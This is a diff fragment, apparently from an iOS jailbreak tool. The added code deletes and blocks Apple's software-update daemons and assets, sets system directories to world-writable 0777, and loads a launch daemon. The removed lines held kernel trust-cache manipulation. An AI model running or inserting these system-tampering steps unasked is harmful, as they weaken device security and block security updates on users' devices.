+        unlink("/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
+        
     }
     
+    open("/.cydia_no_stash",O_RDWR|O_CREAT);
+    chmod("/private", 0777);
+    chmod("/private/var", 0777);
+    chmod("/private/var/mobile", 0777);
+    chmod("/private/var/mobile/Library", 0777);
+    chmod("/private/var/mobile/Library/Preferences", 0777);
     
-    rv = init_kernel(kernel_base, NULL);
-    assert(rv == 0);
+    pid_t pid;
+    
+    // Disable OTA
+//    NSMutableDictionary* md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist"];
+//    [md setObject:[NSNumber numberWithBool:YES] forKey:@"Disabled"];
+//    [md writeToFile:@"/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist" atomically:YES];
+//    
+//    md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist"];
+//    [md setObject:[NSNumber numberWithBool:YES] forKey:@"Disabled"];
+//    [md writeToFile:@"/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist" atomically:YES];
+//
+//    md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/System/Library/LaunchDaemons/com.apple.OTAPKIAssetTool.plist"];
+//    [md setObject:[NSNumber numberWithBool:YES] forKey:@"Disabled"];
+//    [md writeToFile:@"/System/Library/LaunchDaemons/com.apple.OTAPKIAssetTool.plist" atomically:YES];
+//    
+//    md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/System/Library/LaunchDaemons/com.apple.OTATaskingAgent.plist"];
+//    [md setObject:[NSNumber numberWithBool:YES] forKey:@"Disabled"];
+//    [md writeToFile:@"/System/Library/LaunchDaemons/com.apple.OTATaskingAgent.plist" atomically:YES];
+//    
 
-    uint64_t trust_chain = find_trustcache();
-    uint64_t amficache = find_amficache();
-    
-    term_kernel();
-    
-    
-    // INSTALL CYDIA HERE
-    
-    // ----
-    
-    printf("trust_chain = 0x%llx\n", trust_chain);
-    
-    struct trust_mem mem;
-    mem.next = kread_uint64(trust_chain);
-    *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
-    *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;
-    
-//    rv = grab_hashes("/", kread, amficache, mem.next);
-    
-    
-    
+    unlink("/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate");
+    posix_spawn(&pid, "touch", 0, 0, (char**)&(const char*[]){"touch", "/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", NULL}, NULL);
+    chmod("/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", 000);
+    chown("/var/MobileAsset/Assets/com_apple_MobileAsset_SoftwareUpdate", 0, 0);
+    posix_spawn(&pid, "/bin/launchctl", 0, 0, (char**)&(const char*[]){"/bin/launchctl", "load", "/Library/LaunchDaemons/0.reload.plist", NULL}, NULL);
+
+cleanup:
     return ret;
 }
